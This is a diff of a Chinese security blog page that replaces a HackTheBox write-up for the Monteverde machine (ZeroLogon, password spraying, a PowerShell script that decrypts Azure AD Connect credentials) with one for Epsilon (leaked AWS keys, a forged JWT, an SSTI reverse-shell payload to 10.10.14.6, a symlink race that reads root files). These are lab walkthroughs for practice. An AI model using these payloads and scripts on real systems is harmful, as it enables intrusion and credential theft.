@@ -16,44 +16,52 @@
   <meta name="author" content="Aurey7">
   <meta name="keywords" content="">
   
-    <meta name="description" content="信息收集端口信息 这回连Web站点都没有，入口应该是Windows服务了 用户名泄露通过RPC服务发现了10个用户名 1234567891011AAD_987d7f2f57d2mhopeSABatchJobssvc-atasvc-bexecsvc-netappdgalanosrolearysmorganGuest  ZeroLogon竟然有ZeroLogon  游戏结束…  利用空密码Dump H">
+    <meta name="description" content="信息收集端口扫描 git泄露 硬编码登录 请求正常，但还是返回index.html，也没有set-Cookie  访问&#x2F;track发现我已经是Admin了  但发什么都是302跳回index&amp;#x20;  commit 泄露AKSK 配置好AKSK后，通过awscli查看可用的lambda函数  获取函数代码  代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？  sec">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Monteverde HackTheBox">
-<meta property="og:url" content="http://aurey7.github.io.git/2023/09/16/Monteverde-HackTheBox/index.html">
+<meta property="og:title" content="Epsilon HackTheBox">
+<meta property="og:url" content="http://aurey7.github.io.git/2023/09/17/Epsilon-HackTheBox/index.html">
 <meta property="og:site_name" content="Aurey7&#39;s Blog">
-<meta property="og:description" content="信息收集端口信息 这回连Web站点都没有，入口应该是Windows服务了 用户名泄露通过RPC服务发现了10个用户名 1234567891011AAD_987d7f2f57d2mhopeSABatchJobssvc-atasvc-bexecsvc-netappdgalanosrolearysmorganGuest  ZeroLogon竟然有ZeroLogon  游戏结束…  利用空密码Dump H">
+<meta property="og:description" content="信息收集端口扫描 git泄露 硬编码登录 请求正常，但还是返回index.html，也没有set-Cookie  访问&#x2F;track发现我已经是Admin了  但发什么都是302跳回index&amp;#x20;  commit 泄露AKSK 配置好AKSK后，通过awscli查看可用的lambda函数  获取函数代码  代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？  sec">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ns0WgbUCss.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Pu-tXq8DHp.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2fD9lgULHA.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cfnkJIwIcf.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_svxYQL9-kB.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_m4ezcYJvtq.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7qGr_B7Sa1.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_UY6PQunONN.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Kl0UXB6QwU.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JChkNxaDmz.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Azo3I0uL0x.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KFAO4LB1RS.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vSzw7FKSwx.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EUvTUD2V3F.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_C6lt0QqRm4.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5gpLdLmMBR.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJoYpqpCu2.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4kZGsR6BOP.png">
-<meta property="article:published_time" content="2023-09-16T14:33:24.000Z">
-<meta property="article:modified_time" content="2023-09-16T14:35:14.968Z">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkHEk8v4Yz.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8ahnopwPfR.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c8IeKryvZt.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lTwPnzFBaY.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tctk1rWCnL.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GbtkTnKvxe.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fZ_PYLG-wC.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MMOLO_7hMF.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Mw1ja9uH_u.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_F654C1Znj2.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t8UIq7kMRk.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DJFLL2yqDs.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_j4dP1C-SsI.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FSifZ3c6Pv.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R1H0vwZTLq.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f8hNkU2mua.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxB7sGhcUZ.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zZuTUUWv5W.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tz0gDdEoET.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_Qa8Aciie.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_eExs2JyzMQ.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vMEpavFxw1.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fBee67KgoB.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MWiHV18Ixf.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mN1Gx6CYbj.png">
+<meta property="article:published_time" content="2023-09-17T08:49:15.000Z">
+<meta property="article:modified_time" content="2023-09-17T08:51:55.911Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="HackTheBox">
 <meta property="article:tag" content="Cloud Native Security">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ns0WgbUCss.png">
+<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Monteverde HackTheBox - Aurey7&#39;s Blog</title>
+  <title>Epsilon HackTheBox - Aurey7&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -231,7 +239,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Monteverde HackTheBox"></span>
+            <span id="subtitle" data-typed-text="Epsilon HackTheBox"></span>
           
         </div>
 
@@ -242,8 +250,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-16 22:33" pubdate>
-          2023年9月16日 晚上
+        <time datetime="2023-09-17 16:49" pubdate>
+          2023年9月17日 下午
         </time>
       </span>
     
@@ -254,7 +262,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.8k 字
+          1.1k 字
         
       </span>
     
@@ -265,7 +273,7 @@
         
         
         
-          24 分钟
+          10 分钟
         
       </span>
     
@@ -311,59 +319,67 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Monteverde HackTheBox</h1>
+            <h1 style="display: none">Epsilon HackTheBox</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ns0WgbUCss.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></p>
-<p>这回连Web站点都没有，入口应该是Windows服务了</p>
-<h4 id="用户名泄露"><a href="#用户名泄露" class="headerlink" title="用户名泄露"></a>用户名泄露</h4><p>通过RPC服务发现了10个用户名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">AAD_987d7f2f57d2<br>mhope<br>SABatchJobs<br>svc-ata<br>svc-bexec<br>svc-netapp<br>dgalanos<br>roleary<br>smorgan<br>Guest<br><br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Pu-tXq8DHp.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h3><p>竟然有ZeroLogon</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2fD9lgULHA.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>游戏结束…</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cfnkJIwIcf.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>利用空密码Dump Hash</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_svxYQL9-kB.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>PTH</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_m4ezcYJvtq.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="认真打靶"><a href="#认真打靶" class="headerlink" title="认真打靶"></a>认真打靶</h3><p>这样的话也太没意义了，正常路径不应该是这样的。</p>
-<p>墙裂推荐域渗透思维导图：</p>
-<p><a target="_blank" rel="noopener" href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p>
-<h4 id="ASREP-Roast"><a href="#ASREP-Roast" class="headerlink" title="ASREP Roast"></a>ASREP Roast</h4><p>上面获取到了用户名，可以试一下ASREPRoast可惜没有</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7qGr_B7Sa1.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h4><p>从密码策略来看，最小7位；AD域也有锁定账户的策略。我们只能尝试密码喷洒</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_UY6PQunONN.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" /></p>
-<p>先试一下用户名密码相同的情况，获得一个用户密码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Kl0UXB6QwU.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>5985端口虽然开了但是winrm登陆失败</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JChkNxaDmz.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="共享泄漏密码"><a href="#共享泄漏密码" class="headerlink" title="共享泄漏密码"></a>共享泄漏密码</h4><p>尝试看看共享，可读的目录很多</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Azo3I0uL0x.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>发现Azure密码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KFAO4LB1RS.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>尝试winrm登录，获取user flag</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vSzw7FKSwx.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>上BloodHound扫了一遍，没有发现什么可用的提权路径</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EUvTUD2V3F.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>winPEAS发现了Azure Token，了解了一下Token已经是过期的了</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_C6lt0QqRm4.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>后面留意到mhope在Azure Admins组中；</p>
+                <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkHEk8v4Yz.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h4 id="硬编码登录"><a href="#硬编码登录" class="headerlink" title="硬编码登录"></a>硬编码登录</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8ahnopwPfR.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" /></p>
+<p>请求正常，但还是返回index.html，也没有set-Cookie</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c8IeKryvZt.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>访问<code>/track</code>发现我已经是Admin了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lTwPnzFBaY.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但发什么都是302跳回index&#x20;</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tctk1rWCnL.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="commit-泄露AKSK"><a href="#commit-泄露AKSK" class="headerlink" title="commit 泄露AKSK"></a>commit 泄露AKSK</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GbtkTnKvxe.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>配置好AKSK后，通过awscli查看可用的lambda函数</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fZ_PYLG-wC.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>获取函数代码</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MMOLO_7hMF.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>代码本身没什么意义，也不知道哪里可以触发。不过这个secret会不会复用呢？</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Mw1ja9uH_u.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="secret复用"><a href="#secret复用" class="headerlink" title="secret复用"></a>secret复用</h3><p>通过泄露的代码和secret生成JWT</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_F654C1Znj2.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>添加到Cookie中，这次访问home没有重定向！</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t8UIq7kMRk.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>把Cookie写到浏览器缓存里，方便查看</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DJFLL2yqDs.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="SSTI-GetShell"><a href="#SSTI-GetShell" class="headerlink" title="SSTI GetShell"></a>SSTI GetShell</h3><p>其实代码审计的时候就发现order这里是存在SSTI，只是当时利用不了。现在可以访问到了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_j4dP1C-SsI.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" /></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_FSifZ3c6Pv.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><strong>POC</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">addr=123&amp;costume=%7B%7B%22%22.__class__.__bases__%5B0%5D.__subclasses__()%5B132%5D.__init__.__globals__%5B<span class="hljs-string">&#x27;popen&#x27;</span>%5D(<span class="hljs-string">&#x27;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F7781%200%3E%261%22&#x27;</span>).<span class="hljs-built_in">read</span>()%7D%7D&amp;q=123<br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R1H0vwZTLq.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>通过linpeas和进程发现root运行的docker-proxy</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f8hNkU2mua.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" /></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxB7sGhcUZ.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <blockquote>
-<p>Azure Admins是 Azure AD 中的一个预定义组，该组成员可以执行任何 Azure AD 操作</p>
+<p>Docker 代理允许主机和容器之间进行网络通信，通过将端口从主机映射到容器内部，来实现对容器中服务的访问</p>
 </blockquote>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5gpLdLmMBR.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>于是开始寻找如何通过AzureAD提权，大部分都是需要在Azure云上操作的，用不上。</p>
-<h4 id="AzureAD提权"><a href="#AzureAD提权" class="headerlink" title="AzureAD提权"></a>AzureAD提权</h4><p>最终在这个Github项目中发现了通过Azure AD连接同步账户同步整个域hash的提权方式，正好适合我们这种情况。</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJoYpqpCu2.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>XPN大佬写好了获取密码并利用mcrypt.dll解密获取明文密码的PowerShell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-Host <span class="hljs-string">&quot;AD Connect Sync Credential Extract POC (@_xpn_)`n&quot;</span><br><br><span class="hljs-variable">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span class="hljs-string">&quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;</span><br><span class="hljs-variable">$client</span>.Open()<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | Out-Null<br><span class="hljs-variable">$key_id</span> = <span class="hljs-variable">$reader</span>.GetInt32(0)<br><span class="hljs-variable">$instance_id</span> = <span class="hljs-variable">$reader</span>.GetGuid(1)<br><span class="hljs-variable">$entropy</span> = <span class="hljs-variable">$reader</span>.GetGuid(2)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | Out-Null<br><span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(0)<br><span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(1)<br><span class="hljs-variable">$reader</span>.Close()<br><br>add-type -path <span class="hljs-string">&#x27;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#x27;</span><br><span class="hljs-variable">$km</span> = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager<br><span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetActiveCredentialKey([ref]<span class="hljs-variable">$key</span>)<br><span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetKey(1, [ref]<span class="hljs-variable">$key2</span>)<br><span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [ref]<span class="hljs-variable">$decrypted</span>)<br><br><span class="hljs-variable">$domain</span> = select-xml -Content <span class="hljs-variable">$config</span> -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$username</span> = select-xml -Content <span class="hljs-variable">$config</span> -XPath <span class="hljs-string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerXML&#125;&#125;<br><span class="hljs-variable">$password</span> = select-xml -Content <span class="hljs-variable">$decrypted</span> -XPath <span class="hljs-string">&quot;//attribute&quot;</span> | select @&#123;Name = <span class="hljs-string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="hljs-variable">$_</span>.node.InnerText&#125;&#125;<br><br>Write-Host (<span class="hljs-string">&quot;Domain: &quot;</span> + <span class="hljs-variable">$domain</span>.Domain)<br>Write-Host (<span class="hljs-string">&quot;Username: &quot;</span> + <span class="hljs-variable">$username</span>.Username)<br>Write-Host (<span class="hljs-string">&quot;Password: &quot;</span> + <span class="hljs-variable">$password</span>.Password)<br></code></pre></td></tr></table></figure>
-<p>这里需要将第一行的连接信息改一下，否则直接报错退出winrm</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$client</span> = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span class="hljs-string">&quot;Server=127.0.0.1;Database=ADSync;Integrated Security=True</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4kZGsR6BOP.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>获得root flag</p>
+<p>但这似乎不能直接利用，只能上pspy监听一下进程</p>
+<p>发现root一直在运行<code>/usr/bin/backup.sh</code></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zZuTUUWv5W.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这个脚本的问题出在<code>/usr/bin/tar -chvf</code>的h参数上</p>
+<ul>
+<li><code>-h</code>：处理符号链接文件时，将其内容作为文件而不是链接进行处理</li>
+</ul>
+<p>也就是说 <code>ln -s test checksum</code>之后，<code>tar -h</code>会去寻找test文件，而不是checksum。这就造成了利用root任意文件读取的漏洞</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tz0gDdEoET.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>链接文件并将压缩文件复制到tmp</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_Qa8Aciie.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>一番折腾之后发现并不是这个flag</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_eExs2JyzMQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>而且<code>/opt/backups/checksum</code>又被删掉了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vMEpavFxw1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>写个while语句，当<code>/opt/backups/checksum</code>出现的时候，删掉它。再把root.txt链接过去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> [ -e /opt/backups/checksum ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">rm</span> -f /opt/backups/checksum; <span class="hljs-built_in">ln</span> -s -f /root/root.txt /opt/backups/checksum; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ln done!&quot;</span>; <span class="hljs-built_in">break</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fBee67KgoB.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>几次尝试之后成功获取root flag</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MWiHV18Ixf.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>对味，如果想GetShell的话可以读SSH私钥</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mN1Gx6CYbj.png" srcset="/img/loading.gif" lazyload alt=""></p>
 
                 
               </div>
@@ -390,8 +406,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Monteverde HackTheBox</div>
-      <div>http://aurey7.github.io.git/2023/09/16/Monteverde-HackTheBox/</div>
+      <div>Epsilon HackTheBox</div>
+      <div>http://aurey7.github.io.git/2023/09/17/Epsilon-HackTheBox/</div>
     </div>
     <div class="license-meta">
       
@@ -403,7 +419,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月16日</div>
+          <div>2023年9月17日</div>
         </div>
       
       
@@ -435,18 +451,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/17/Epsilon-HackTheBox/" title="Epsilon HackTheBox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Epsilon HackTheBox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/24/Bucket-HackTheBox/" title="Bucket-HackTheBox">
-                        <span class="hidden-mobile">Bucket-HackTheBox</span>
+                      <a href="/2023/09/16/Monteverde-HackTheBox/" title="Monteverde HackTheBox">
+                        <span class="hidden-mobile">Monteverde HackTheBox</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
